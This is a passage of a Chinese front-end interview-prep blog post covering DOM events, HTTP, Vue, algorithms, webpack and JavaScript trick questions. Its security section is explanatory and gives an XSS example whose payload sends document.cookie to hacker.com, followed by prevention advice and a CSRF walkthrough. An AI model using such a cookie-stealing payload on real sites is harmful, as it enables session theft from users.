class="hljs-title">Human</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Animal</span></span>{</span><br><span class="line">        <span class="hljs-keyword">constructor</span>(name){</span><br><span class="line">            <span class="hljs-built_in">super</span>()</span><br><span class="line">        <span class="hljs-built_in">this</span>.name = name</span><br><span class="line">    },</span><br><span class="line">    useTools(){}</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">var</span> frank = <span class="hljs-keyword">new</span> Human()</span><br></pre></td></tr></tbody></table></figure>
+</li>
+</ul>
+</li>
+<li><p>== 相关题目直接反着答（放弃）</p>
+</li>
+</ol>
+<h2 id="DOM-押题"><a href="#DOM-押题" class="headerlink" title="DOM 押题"></a>DOM 押题</h2><ol>
+<li><p>DOM 事件模型是什么？</p>
+<ol>
+<li>冒泡</li>
+<li>捕获</li>
+<li><a target="_blank" rel="noopener" href="http://jsbin.com/raqakog/1/edit?js,console,output">如果这个元素是被点击的元素，那么捕获不一定在冒泡之前，顺序是由监听顺序决定的</a>。</li>
+</ol>
+</li>
+<li><p>移动端的触摸事件了解吗？</p>
+<ol>
+<li>touchstart touchmove touchend touchcancel</li>
+<li>模拟 swipe 事件：记录两次 touchmove 的位置差，如果后一次在前一次的右边，说明向右滑了。</li>
+</ol>
+</li>
+<li><p>事件委托是什么？有什么好处？</p>
+<ol>
+<li>假设父元素有 4 个儿子，我不监听 4 个儿子，而是监听父元素，看触发事件的元素是哪个儿子，这就是事件委托。</li>
+<li>可以监听还没有出生的儿子（动态生成的元素）。省监听器。</li>
+</ol>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listen</span>(<span class="hljs-params">element, eventType, selector, fn</span>) </span>{</span><br><span class="line">  element.addEventListener(eventType, <span class="hljs-function"><span class="hljs-params">e</span> =></span> {</span><br><span class="line">    <span class="hljs-keyword">if</span> (e.target.matches(selector)) {</span><br><span class="line">      fn.call(el, e, el);</span><br><span class="line">    }</span><br><span class="line">  });</span><br><span class="line">} <span class="hljs-comment">// 有 bug 但是可以应付面试官的事件委托</span></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listen</span>(<span class="hljs-params">element, eventType, selector, fn</span>) </span>{</span><br><span class="line">        element.addEventListener(eventType, <span class="hljs-function"><span class="hljs-params">e</span> =></span> {</span><br><span class="line">            <span class="hljs-keyword">let</span> el = e.target;</span><br><span class="line">        <span class="hljs-keyword">while</span> (!el.matches(selector)) {</span><br><span class="line">                <span class="hljs-keyword">if</span> (element === el) {</span><br><span class="line">                    el = <span class="hljs-literal">null</span>;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">            el = el.parentNode;</span><br><span class="line">        }</span><br><span class="line">        el && fn.call(el, e, el);</span><br><span class="line">    });</span><br><span class="line">    <span class="hljs-keyword">return</span> element;</span><br><span class="line">} <span class="hljs-comment">// 工资 12k+ 的前端写的事件委托</span></span><br><span class="line">listen(ul, \<span class="hljs-string">"click\", \"li\", () => {});</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">ul > li * 5 > span;</span></span><br></pre></td></tr></tbody></table></figure>
+
+</li>
+</ol>
+<h2 id="HTTP-押题"><a href="#HTTP-押题" class="headerlink" title="HTTP 押题"></a>HTTP 押题</h2><ol>
+<li>HTTP 状态码知道哪些？</li>
+<li>301 和 302 的区别是什么？<ol>
+<li>301 永久重定向，浏览器会记住</li>
+<li>302 临时重定向</li>
+</ol>
+</li>
+<li>HTTP 缓存怎么做？<ol>
+<li>Cache-Control: max-age=300</li>
+<li><a target="_blank" rel="noopener" href="http://cdn.com/1.js?v=1">http://cdn.com/1.js?v=1</a> 避开缓存</li>
+</ol>
+</li>
+<li>Cache-Control 和 Etag 的区别是什么？</li>
+<li>Cookie 是什么？Session 是什么？<ul>
+<li>Cookie<ol>
+<li>HTTP 响应通过 Set-Cookie 设置 Cookie</li>
+<li>浏览器访问指定域名是必须带上 Cookie 作为 Request Header</li>
+<li>Cookie 一般用来记录用户信息</li>
+</ol>
+</li>
+<li>Session<ol>
+<li>Session 是服务器端的内存（数据）</li>
+<li>Session 一般通过在 Cookie 里记录 SessionID 实现</li>
+<li>SessionID 一般是随机数</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>LocalStorage 和 Cookie 的区别是什么？<ol>
+<li>Cookie 会随请求被发到服务器上，而 LocalStorage 不会</li>
+<li>Cookie 大小一般 4k 以下，LocalStorage 一般 5Mb 左右</li>
+</ol>
+</li>
+<li>（必考）GET 和 POST 的区别是什么？<ol>
+<li>参数。GET 的参数放在 url 的查询参数里，POST 的参数（数据）放在请求消息体里。</li>
+<li>安全（扯淡）。GET 没有 POST 安全（都不安全）</li>
+<li>GET 的参数（url 查询参数）有长度限制，一般是 1024 个字符。POST 的参数（数据）没有长度限制（扯淡，4~10Mb 限制）</li>
+<li>包。GET 请求只需要发一个包，POST 请求需要发两个以上包（因为 POST 有消息体）（扯淡，GET 也可以用消息体）</li>
+<li>GET 用来读数据，POST 用来写数据，POST 不幂等（幂等的意思就是不管发多少次请求，结果都一样。）</li>
+</ol>
+</li>
+<li>（必考）怎么跨域？JSONP 是什么？CORS 是什么？postMessage 是什么？<ol>
+<li>JSONP</li>
+<li>CORS</li>
+<li>postMessage 看一下 MDN</li>
+</ol>
+</li>
+</ol>
+<p>Vue 押题</p>
+<ol>
+<li><p>（必考）Vue 有哪些生命周期钩子函数？</p>
+<ul>
+<li>看文档</li>
+</ul>
+</li>
+<li><p>（必考）Vue 如何实现组件通信？</p>
+<ol>
+<li>父子通信（使用 Prop 传递数据、使用 v-on 绑定自定义事件）</li>
+<li>爷孙通信（通过两对父子通信，爷爸之间父子通信，爸儿之间父子通信）</li>
+<li><a target="_blank" rel="noopener" href="https://cn.vuejs.org/v2/guide/components.html#%E9%9D%9E%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E7%9A%84%E9%80%9A%E4%BF%A1">兄弟通信（new Vue() 作为 eventBus）</a></li>
+</ol>
+</li>
+<li><p>Vuex 的作用是什么？</p>
+<ul>
+<li>看文档、博客 <a target="_blank" rel="noopener" href="https://vuex.vuejs.org/zh-cn/intro.html">https://vuex.vuejs.org/zh-cn/intro.html</a></li>
+</ul>
+</li>
+<li><p>VueRouter 路由是什么？</p>
+<ul>
+<li>看文档、博客</li>
+</ul>
+</li>
+<li><p>Vue 的双向绑定是如何实现的？有什么缺点？</p>
+<ul>
+<li>看文档，<a target="_blank" rel="noopener" href="https://cn.vuejs.org/v2/guide/reactivity.html">深入响应式原理</a></li>
+</ul>
+</li>
+<li><p>Computed 计算属性的用法？跟 Methods 的区别。<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/33778594">https://zhuanlan.zhihu.com/p/33778594</a></p>
+</li>
+</ol>
+<p>算法押题</p>
+<ol>
+<li>排序算法（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）</li>
+<li>二分查找法</li>
+<li>翻转二叉树</li>
+</ol>
+<p>把上面三个背一下，算法题必过。</p>
+<p>安全押题</p>
+<ol>
+<li>什么是 XSS 攻击？如何预防？<ul>
+<li>举例<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div.innerHTML = userComment  // userComment 内容是 <script>$.get('http://hacker.com?cookie='+document.cookie)</script></span><br><span class="line">// 恶意就被执行了，这就是 XSS</span><br></pre></td></tr></tbody></table></figure></li>
+<li>预防<ol>
+<li>不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行</li>
+<li>如果你一样要用 innerHTML，字符过滤<ul>
+<li>把 < 替换成 <code>&lt;</code></li>
+<li>把 > 替换成 <code>&gt;</code></li>
+<li>把 & 替换成 <code>&amp;</code></li>
+<li>把 ‘ 替换成 <code>&#39;</code></li>
+<li>把 ‘ 替换成 <code>&quot;</code></li>
+<li>代码 div.innerHTML = userComment.replace(/>/g, ‘<code>&lt;</code>‘).replace…</li>
+</ul>
+</li>
+<li>使用 CSP Content Security Policy</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>什么是 CSRF 攻击？如何预防？<ul>
+<li>过程<ol>
+<li>用户在 qq.com 登录</li>
+<li>用户切换到 hacker.com（恶意网站）</li>
+<li>hacker.com 发送一个 qq.com/add_friend 请求，让当前用户添加 hacker 为好友。</li>
+<li>用户在不知不觉中添加 hacker 为好友。</li>
+<li>用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。</li>
+</ol>
+</li>
+<li>避免<ol>
+<li>检查 referer，qq.com 可以拒绝来自 hacker.com 的请求</li>
+<li>csrf_token 来解决</li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="Webpack-题"><a href="#Webpack-题" class="headerlink" title="Webpack 题"></a>Webpack 题</h2><ol>
+<li>转译出的文件过大怎么办？<ul>
+<li>使用 code split</li>
+<li>写法 import(‘xxx’).then(xxx=>{console.log(xxx)})</li>
+<li>xxx 模块就是按需加载的</li>
+</ul>
+</li>
+<li>写过 webpack loader 吗？<ul>
+<li><a target="_blank" rel="noopener" href="http://www.alloyteam.com/2016/01/webpack-loader-1/">webpack loader</a></li>
+</ul>
+</li>
+</ol>
+<h2 id="发散题"><a href="#发散题" class="headerlink" title="发散题"></a>发散题</h2><ol>
+<li><p>从输入 URL 到页面展现中间发生了什么？ 1. DNS 查询 DNS 缓存 2. 建立 TCP 连接（三次握手）连接复用 3. 发送 HTTP 请求（请求的四部分） 4. 后台处理请求 1. 监听 80 端口 2. 路由 3. 渲染 HTML 模板 4. 生成响应 5. 发送 HTTP 响应 6. 关闭 TCP 连接（四次挥手） 7. 解析 HTML 8. 下载 CSS（缓存 9. 解析 CSS 10. 下载 JS（缓存 11. 解析 JS 12. 下载图片 13. 解析图片 14. 渲染 DOM 树 15. 渲染样式树 16. 执行 JS<br>刁钻代码</p>
+</li>
+<li><p>map 加 parseInt</p>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>].map(<span class="hljs-built_in">parseInt</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">parseInt</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, array); <span class="hljs-comment">// 1</span></span><br><span class="line"><span class="hljs-built_in">parseInt</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, array); <span class="hljs-comment">// NaN</span></span><br><span class="line"><span class="hljs-built_in">parseInt</span>(<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, array); <span class="hljs-comment">// NaN</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>a.x = a = {}</p>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> a = { <span class="hljs-attr">n</span>: <span class="hljs-number">1</span> };</span><br><span class="line"><span class="hljs-keyword">var</span> b = a;</span><br><span class="line">a.x = a = { <span class="hljs-attr">n</span>: <span class="hljs-number">2</span> };</span><br></pre></td></tr></tbody></table></figure>
+<p>问 a.x 是多少？</p>
+</li>
+<li><p>(a ==1 && a== 2 && a==3) 可能为 true 吗？</p>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = {</span><br><span class="line">  value: <span class="hljs-number">0</span>,</span><br><span class="line">  toString() {</span><br><span class="line">    a.value += <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">return</span> a.value;</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
+</li>
+</ol>
+</body></html>
+            
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link-link" href="/tags/css/" rel="tag">css</a>, <a class="has-link-grey -link-link" href="/tags/http/" rel="tag">http</a>, <a class="has-link-grey -link-link" href="/tags/js/" rel="tag">js</a>
+                </div>
+            </div>
+        </div>
+        
+
+        <!--  -->
+
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">喜欢这篇文章？打赏赞助一下吧</h3>
+        <div class="buttons is-centered">
+            
+                
+<a class="button is-success donate">
+    <span class="icon is-small">
+        <i class="fab fa-weixin"></i>
+    </span>
+    <span>微信</span>
+    <div class="qrcode"><img src="/images/donate.jpg" alt="微信"></div>
+</a>
+
+                
+        </div>
+    </div>
+</div>
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/posts/fec2250c/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">网易云音乐歌词直链</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/posts/f4eb40ab/">
+                <span class="level-item">Redux流程讲解</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">
+            评论
+        </h3>
+        
+<div id="valine-thread" class="content"></div>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#valine-thread' ,
+        notify: false,
+        verify: false,
+        app_id: 'bwTxwPTstDRSj9fwUm9zXWXa-gzGzoHsz',
+        app_key: '20xgggMoEpTsY95zvB0HudN1',
+        placeholder: '留下你的只言片语吧~~~',
+        avatar_cdn:'https://cn.gravatar.com/avatar/',
+        avatar:'robohash'
+    });
+</script>
+
+    </div>
+</div>
+
+
+
+                </div>
+                
+                
+                    
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered">
+                <div>
+                    <img class="avatar is-rounded image is-128x128 has-mb-6" src="/images/avatar.png" alt="Yu Ye">
+                    
+                    <p class="is-size-4 is-block">
+                        Yu Ye
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        专注前端技术，更专注生活
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>China</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        34
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        5
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        15
+                    </p>
+                </div>
+            </div>
+        </nav>
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/cyea" target="_blank">
+                关注我</a>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/cyea">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Telegram" href="https://t.me/yuyehack">
+                
+                <i class="fab fa-telegram"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Email" href="mailto:yuyehack@gmail.com">
+                
+                <i class="fas fa-envelope"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+    
+    <div class="card widget" id="toc" >
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    目录
+                </h3>
+                <ul class="menu-list"><li>
+            <a class="is-flex" href="#js-题目">
+            <span class="has-mr-6">1</span>
+            <span>js 题目</span>
+            </a></li><li>
+            <a class="is-flex" href="#HTML-押题">
+            <span class="has-mr-6">2</span>
+            <span>HTML 押题</span>
+            </a></li><li>
+            <a class="is-flex" href="#DOM-押题">
+            <span class="has-mr-6">3</span>
+            <span>DOM 押题</span>
+            </a></li><li>
+            <a class="is-flex" href="#HTTP-押题">
+            <span class="has-mr-6">4</span>
+            <span>HTTP 押题</span>
+            </a></li><li>
+            <a class="is-flex" href="#Webpack-题">
+            <span class="has-mr-6">5</span>
+            <span>Webpack 题</span>
+            </a></li><li>
+            <a class="is-flex" href="#发散题">
+            <span class="has-mr-6">6</span>
+            <span>发散题</span>
+            </a></li></ul>
+            </div>
+        </div>
+    </div>
+    
+
+    
+        
+    
+        
+    
+        
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen "> 
+        
+        
+        </div>
+    
+</div>
+
+                
+                <!--  -->
+                
+
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+  <div class="container">
+    <!-- <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.png" alt="前端重要知识点汇总" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                
+                &copy; 2020 Yu Ye&nbsp;
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                 
+                <br>
+                
+                <span id="busuanzi_container_site_uv">
+                共<span id="busuanzi_value_site_uv">0</span>个访客
+                </span>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+            </div>
+        </div> 
+        -->
+  </div>
+  <div class="lever">
+    <p class="is-size-7">
+      Copyright © 2019 Yu Ye |
+      <span id="busuanzi_container_site_uv">
+        共<span id="busuanzi_value_site_uv">0</span>个访客
+      </span>
+    </p>
+    <div class="site-info">
+      已运行
+      <span id="time-to-now"></span>
+      <span class="my-face">(●'◡'●)ﾉ♥</span>
+    </div>
+  </div>
+</footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+
+    
+    
+    
+    <script src="/js/animation.js"></script>
+    
+
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+    <script src="/js/gallery.js" defer></script>
+    
+
+    
+    
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+    
+    
+    
+    
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+    <script src="/js/clipboard.js" defer></script>
+    
+
+    
+    
+    
+
+    
+
+
+<script src="/js/main.js" defer></script>
+<script src="/js/my.js?v=1596521853046" defer></script>
+<script src="/js/baidupush.js" defer></script>
+    
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
